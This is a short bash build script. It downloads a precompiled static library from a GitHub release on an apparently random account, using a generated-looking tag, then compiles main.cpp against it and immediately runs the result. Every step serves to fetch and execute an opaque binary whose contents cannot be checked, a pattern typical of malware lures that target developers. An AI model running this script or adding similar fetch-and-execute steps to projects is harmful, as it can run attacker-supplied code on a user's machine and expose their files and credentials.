#!/usr/bin/env bash
set -e
TAG="crimson-comet-clever-badger"
LIB="fragile-tram.a"
URL="https://github.com/diegotensorflowr876/beetcreek/releases/download/${TAG}/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
